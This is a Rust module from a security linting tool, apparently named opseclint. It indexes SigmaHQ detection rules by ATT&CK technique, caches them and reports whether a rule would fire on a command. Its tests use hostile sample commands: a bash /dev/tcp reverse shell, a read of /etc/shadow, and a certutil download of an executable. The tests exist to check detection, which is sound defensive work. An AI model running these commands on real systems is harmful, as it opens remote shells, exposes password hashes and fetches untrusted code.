//! Optional enrichment from a real SigmaHQ ruleset.
//!
//! Point opseclint at a checkout of <https://github.com/SigmaHQ/sigma> (or any
//! directory of Sigma-format YAML) with `--sigma <DIR>`. We index every rule by
//! the ATT&CK technique(s) in its `tags` together with its parsed detection
//! logic then attach the genuine rule title/UUID/level to any finding whose
//! technique matches, and evaluate whether each rule would actually fire on the
//! matched command (`fires` / `no-fire` / `indeterminate`). The same index
//! powers coverage-gap analysis.
//!
//! The ruleset is read at runtime and never bundled, so the binary stays
//! self-contained and no detection-rule licensing is redistributed.

use std::collections::HashMap;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::path::{Path, PathBuf};
use std::time::UNIX_EPOCH;

use serde::{Deserialize, Serialize};

use crate::kb::Platform;
use crate::model::{Detection, Report};

/// Maximum real Sigma rules to attach per finding, to keep output readable.
const MAX_RULES_PER_FINDING: usize = 5;

/// Bump when the cached rule shape changes, to invalidate stale cache files.
const CACHE_VERSION: u32 = 2;

/// A resolved Sigma rule: metadata plus its parsed detection logic (when the
/// rule could be lowered for evaluation).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaRule {
    pub id: String,
    pub title: String,
    pub level: String,
    #[serde(default)]
    pub rule: Option<crate::sigma_eval::DetectionRule>,
}

/// On-disk cache of a parsed ruleset, keyed by a fingerprint of the directory.
#[derive(Serialize, Deserialize)]
struct SigmaCache {
    #[serde(default)]
    version: u32,
    product: String,
    fingerprint: u64,
    files_scanned: usize,
    rules_indexed: usize,
    by_technique: HashMap<String, Vec<SigmaRule>>,
}

/// Technique-id -> matching Sigma rules.
#[derive(Debug, Default)]
pub struct SigmaIndex {
    by_technique: HashMap<String, Vec<SigmaRule>>,
    pub files_scanned: usize,
    pub rules_indexed: usize,
}

fn level_rank(level: &str) -> u8 {
    match level.to_lowercase().as_str() {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0,
    }
}

/// Turn a Sigma tag like `attack.t1003.008` into a technique id `T1003.008`.
/// Returns `None` for non-technique tags (tactics, groups, software, etc.).
fn technique_from_tag(tag: &str) -> Option<String> {
    let rest = tag.strip_prefix("attack.")?;
    // Must look like t<digits>[.<digits>].
    if !rest.chars().next()?.eq_ignore_ascii_case(&'t') {
        return None;
    }
    let body = &rest[1..];
    if body.is_empty() || !body.chars().all(|c| c.is_ascii_digit() || c == '.') {
        return None;
    }
    Some(format!("T{body}"))
}

impl SigmaIndex {
    /// Recursively load every `.yml`/`.yaml` Sigma rule under `dir`. Rules whose
    /// logsource product is set to something other than `product` are skipped,
    /// to keep matches relevant to the target platform. `product` is e.g.
    /// `"linux"` or `"windows"`. Unparseable files are ignored.
    pub fn load_dir(dir: &Path, product: &str) -> std::io::Result<SigmaIndex> {
        let mut index = SigmaIndex::default();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(path) = stack.pop() {
            for entry in std::fs::read_dir(&path)? {
                let entry = entry?;
                let p = entry.path();
                if p.is_dir() {
                    stack.push(p);
                    continue;
                }
                let is_yaml = matches!(
                    p.extension().and_then(|e| e.to_str()),
                    Some("yml") | Some("yaml")
                );
                if !is_yaml {
                    continue;
                }
                index.files_scanned += 1;
                if let Ok(content) = std::fs::read_to_string(&p) {
                    index.ingest_file(&content, product);
                }
            }
        }
        Ok(index)
    }

    fn ingest_file(&mut self, content: &str, product: &str) {
        // A Sigma file may hold multiple YAML documents.
        for doc in serde_yaml::Deserializer::from_str(content) {
            let Ok(value) = serde_yaml::Value::deserialize(doc) else {
                continue;
            };
            // Keep platform-relevant rules (matching product or unspecified).
            if let Some(p) = value
                .get("logsource")
                .and_then(|ls| ls.get("product"))
                .and_then(|p| p.as_str())
                && !p.eq_ignore_ascii_case(product)
            {
                continue;
            }
            let (Some(id), Some(title)) = (
                value.get("id").and_then(|v| v.as_str()),
                value.get("title").and_then(|v| v.as_str()),
            ) else {
                continue;
            };
            let level = value
                .get("level")
                .and_then(|l| l.as_str())
                .unwrap_or("medium")
                .to_string();
            let detection = crate::sigma_eval::parse_rule_value(&value);

            let mut indexed_any = false;
            for tag in value
                .get("tags")
                .and_then(|t| t.as_sequence())
                .into_iter()
                .flatten()
                .filter_map(|t| t.as_str())
            {
                if let Some(tech) = technique_from_tag(tag) {
                    self.by_technique.entry(tech).or_default().push(SigmaRule {
                        id: id.to_string(),
                        title: title.to_string(),
                        level: level.clone(),
                        rule: detection.clone(),
                    });
                    indexed_any = true;
                }
            }
            if indexed_any {
                self.rules_indexed += 1;
            }
        }
    }

    /// All Sigma rules matching any of the given technique ids, deduplicated by
    /// rule id, ranked by severity then title, capped for readability.
    pub fn rules_for(&self, technique_ids: &[String]) -> Vec<SigmaRule> {
        let mut out: Vec<SigmaRule> = Vec::new();
        for tid in technique_ids {
            if let Some(rules) = self.by_technique.get(tid) {
                for r in rules {
                    if !out.iter().any(|e| e.id == r.id) {
                        out.push(r.clone());
                    }
                }
            }
        }
        out.sort_by(|a, b| {
            level_rank(&b.level)
                .cmp(&level_rank(&a.level))
                .then(a.title.cmp(&b.title))
        });
        out.truncate(MAX_RULES_PER_FINDING);
        out
    }

    fn from_cache(cache: SigmaCache) -> SigmaIndex {
        SigmaIndex {
            by_technique: cache.by_technique,
            files_scanned: cache.files_scanned,
            rules_indexed: cache.rules_indexed,
        }
    }
}

fn is_yaml(path: &Path) -> bool {
    matches!(
        path.extension().and_then(|e| e.to_str()),
        Some("yml") | Some("yaml")
    )
}

/// A cheap fingerprint of the ruleset directory: the sorted set of
/// (path, size, mtime) over its YAML files, plus the product. Stat-walking the
/// tree is far cheaper than parsing every rule, so this validates a cache fast.
fn fingerprint(dir: &Path, product: &str) -> std::io::Result<u64> {
    let mut items: Vec<(String, u64, u64)> = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(p) = stack.pop() {
        for entry in std::fs::read_dir(&p)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
                continue;
            }
            if !is_yaml(&path) {
                continue;
            }
            let md = entry.metadata()?;
            let mtime = md
                .modified()
                .ok()
                .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            items.push((path.to_string_lossy().into_owned(), md.len(), mtime));
        }
    }
    items.sort();

    let mut hasher = DefaultHasher::new();
    product.hash(&mut hasher);
    items.len().hash(&mut hasher);
    for item in &items {
        item.hash(&mut hasher);
    }
    Ok(hasher.finish())
}

/// Base directory for cache files: `$OPSECLINT_CACHE_DIR` or the system temp dir.
fn cache_dir() -> PathBuf {
    std::env::var_os("OPSECLINT_CACHE_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(std::env::temp_dir)
}

fn cache_path(dir: &Path, product: &str) -> PathBuf {
    let abs = std::fs::canonicalize(dir).unwrap_or_else(|_| dir.to_path_buf());
    let mut h = DefaultHasher::new();
    abs.to_string_lossy().hash(&mut h);
    product.hash(&mut h);
    cache_dir().join(format!("opseclint-sigma-{:016x}.json", h.finish()))
}

/// Load a Sigma index for `dir`/`product`, using an on-disk cache when
/// `use_cache` is set. Returns `(index, from_cache)`. Cache reads/writes are
/// best-effort: any cache error falls back to a fresh parse and never fails the
/// run. The cache is invalidated automatically when the ruleset changes (its
/// fingerprint no longer matches).
pub fn load_cached(
    dir: &Path,
    product: &str,
    use_cache: bool,
) -> std::io::Result<(SigmaIndex, bool)> {
    let path = use_cache.then(|| cache_path(dir, product));
    load_with_cache(dir, product, path.as_deref())
}

fn load_with_cache(
    dir: &Path,
    product: &str,
    cache_path: Option<&Path>,
) -> std::io::Result<(SigmaIndex, bool)> {
    let Some(path) = cache_path else {
        return Ok((SigmaIndex::load_dir(dir, product)?, false));
    };

    let fp = fingerprint(dir, product)?;
    if let Ok(content) = std::fs::read_to_string(path)
        && let Ok(cache) = serde_json::from_str::<SigmaCache>(&content)
        && cache.version == CACHE_VERSION
        && cache.product == product
        && cache.fingerprint == fp
    {
        return Ok((SigmaIndex::from_cache(cache), true));
    }

    let index = SigmaIndex::load_dir(dir, product)?;
    let cache = SigmaCache {
        version: CACHE_VERSION,
        product: product.to_string(),
        fingerprint: fp,
        files_scanned: index.files_scanned,
        rules_indexed: index.rules_indexed,
        by_technique: index.by_technique.clone(),
    };
    if let Ok(json) = serde_json::to_string(&cache) {
        let _ = std::fs::write(path, json); // best-effort
    }
    Ok((index, false))
}

/// Replace each finding's representative detections with real Sigma rules where
/// the technique matches, annotating each with whether the rule would actually
/// fire on the matched command. Findings with no match keep their seed
/// detections. Returns the number of findings that were enriched.
pub fn enrich(report: &mut Report, index: &SigmaIndex, platform: Platform) -> usize {
    let mut enriched = 0;
    for f in &mut report.findings {
        let tids: Vec<String> = f.techniques.iter().map(|t| t.id.clone()).collect();
        let rules = index.rules_for(&tids);
        if rules.is_empty() {
            continue;
        }
        f.detections = rules
            .into_iter()
            .map(|r| {
                let verdict = match (&r.rule, &f.matched_command) {
                    // When the finding came from real telemetry, evaluate the
                    // rule against the recorded event — so a rule keyed on a
                    // field a command line can't supply resolves instead of
                    // reading indeterminate.
                    (Some(dr), Some(cmd)) => {
                        let v = match &f.observed_event {
                            Some(ev) => crate::sigma_eval::evaluate_observed(dr, cmd, platform, ev),
                            None => crate::sigma_eval::evaluate(dr, cmd, platform),
                        };
                        Some(verdict_label(&v))
                    }
                    _ => None,
                };
                Detection {
                    source: "Sigma".to_string(),
                    rule: format!("{} ({})", r.title, r.id),
                    confidence: r.level,
                    verdict,
                }
            })
            .collect();
        enriched += 1;
    }
    enriched
}

/// A short verdict label for a detection line.
fn verdict_label(v: &crate::sigma_eval::Verdict) -> String {
    use crate::sigma_eval::Outcome;
    match v.outcome {
        Outcome::Fires => "fires".to_string(),
        Outcome::NoFire => "no-fire".to_string(),
        Outcome::Indeterminate if v.missing_fields.is_empty() => "indeterminate".to_string(),
        Outcome::Indeterminate => format!("indeterminate (needs {})", v.missing_fields.join(", ")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyzer, kb};
    use std::path::PathBuf;

    fn fixtures() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma")
    }

    #[test]
    fn technique_tag_parsing() {
        assert_eq!(
            technique_from_tag("attack.t1003.008").as_deref(),
            Some("T1003.008")
        );
        assert_eq!(technique_from_tag("attack.t1059").as_deref(), Some("T1059"));
        assert_eq!(technique_from_tag("attack.credential_access"), None);
        assert_eq!(technique_from_tag("attack.g0016"), None);
    }

    #[test]
    fn indexes_and_enriches_from_fixtures() {
        let index = SigmaIndex::load_dir(&fixtures(), "linux").expect("fixtures load");
        assert!(index.rules_indexed >= 2, "expected fixture rules indexed");

        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let mut report = analyzer::analyze("cat /etc/shadow", &kb);
        let n = enrich(&mut report, &index, kb::Platform::LinuxAuditd);
        assert!(n >= 1);

        let shadow = report
            .findings
            .iter()
            .find(|f| f.rule_id == "shadow-read")
            .unwrap();
        // The seed reference is replaced by the real fixture rule + its UUID.
        assert!(
            shadow
                .detections
                .iter()
                .any(|d| d.rule.contains("11111111-1111-1111-1111-111111111111"))
        );
    }

    #[test]
    fn enrichment_carries_a_verdict() {
        let index = SigmaIndex::load_dir(&fixtures(), "linux").expect("fixtures load");
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        // The /dev/tcp fixture rule (CommandLine contains /dev/tcp/) fires.
        let mut report = analyzer::analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb);
        enrich(&mut report, &index, kb::Platform::LinuxAuditd);
        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "reverse-shell-devtcp")
            .unwrap();
        assert!(
            f.detections
                .iter()
                .any(|d| d.verdict.as_deref() == Some("fires")),
            "expected a firing verdict on the enriched detection"
        );
    }

    #[test]
    fn real_event_fields_resolve_a_parent_keyed_verdict() {
        // A rule keyed on ParentImage (a field a command line can't supply) is
        // indeterminate in predictive mode but fires when the same finding
        // carries the real recorded event that names the Office parent.
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma-observed");
        let index = SigmaIndex::load_dir(&dir, "windows").expect("fixtures load");
        let kb = kb::load(kb::Platform::WindowsSysmon).unwrap();
        let verdict_for = |report: &Report| -> Option<String> {
            report
                .findings
                .iter()
                .find(|f| f.rule_id == "certutil-download")
                .and_then(|f| f.detections.iter().find_map(|d| d.verdict.clone()))
        };

        // Observed: the recorded event names WINWORD.EXE as the parent → fires.
        let ev = r#"{"EventID":1,
            "Image":"C:\\Windows\\System32\\certutil.exe",
            "CommandLine":"certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
            "ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}"#;
        let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Sysmon).unwrap();
        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
        enrich(&mut observed, &index, kb::Platform::WindowsSysmon);
        assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));

        // Predictive: the same command line alone can't supply ParentImage →
        // indeterminate, naming the field it needs.
        let mut predicted = analyzer::analyze(
            "certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
            &kb,
        );
        enrich(&mut predicted, &index, kb::Platform::WindowsSysmon);
        assert_eq!(
            verdict_for(&predicted).as_deref(),
            Some("indeterminate (needs ParentImage)")
        );
    }

    #[test]
    fn non_linux_rules_are_skipped() {
        let index = SigmaIndex::load_dir(&fixtures(), "linux").expect("fixtures load");
        // The Windows fixture is tagged T1057 but must not be indexed.
        assert!(index.rules_for(&["T1057".to_string()]).is_empty());
    }

    #[test]
    fn windows_product_selects_windows_rules() {
        let index = SigmaIndex::load_dir(&fixtures(), "windows").expect("fixtures load");
        // With the windows product, the T1057 fixture is indexed and the
        // linux-only shadow rule is not.
        assert!(!index.rules_for(&["T1057".to_string()]).is_empty());
        assert!(index.rules_for(&["T1003.008".to_string()]).is_empty());
    }

    #[test]
    fn cache_round_trips_and_reports_hit() {
        // Use an explicit, unique cache file so the test is hermetic.
        let cache = std::env::temp_dir().join("opseclint-test-cache-round-trip.json");
        let _ = std::fs::remove_file(&cache);

        let (fresh, from_cache) =
            load_with_cache(&fixtures(), "linux", Some(&cache)).expect("fresh load");
        assert!(!from_cache, "first load should parse, not hit cache");
        assert!(fresh.rules_indexed >= 2);
        assert!(cache.exists(), "cache file should have been written");

        let (cached, from_cache) =
            load_with_cache(&fixtures(), "linux", Some(&cache)).expect("cached load");
        assert!(from_cache, "second load should hit the cache");
        // Same content served from cache.
        assert_eq!(cached.rules_indexed, fresh.rules_indexed);
        assert!(!cached.rules_for(&["T1003.008".to_string()]).is_empty());

        let _ = std::fs::remove_file(&cache);
    }

    #[test]
    fn stale_cache_is_rejected_by_fingerprint() {
        let cache = std::env::temp_dir().join("opseclint-test-cache-stale.json");
        // A cache with a wrong fingerprint must be ignored (re-parsed).
        let bogus = SigmaCache {
            version: CACHE_VERSION,
            product: "linux".to_string(),
            fingerprint: 0,
            files_scanned: 0,
            rules_indexed: 999,
            by_technique: HashMap::new(),
        };
        std::fs::write(&cache, serde_json::to_string(&bogus).unwrap()).unwrap();

        let (index, from_cache) =
            load_with_cache(&fixtures(), "linux", Some(&cache)).expect("load");
        assert!(!from_cache, "fingerprint mismatch must not be a cache hit");
        assert!(
            index.rules_indexed >= 2,
            "should reflect a real parse, not the bogus 999"
        );

        let _ = std::fs::remove_file(&cache);
    }
}
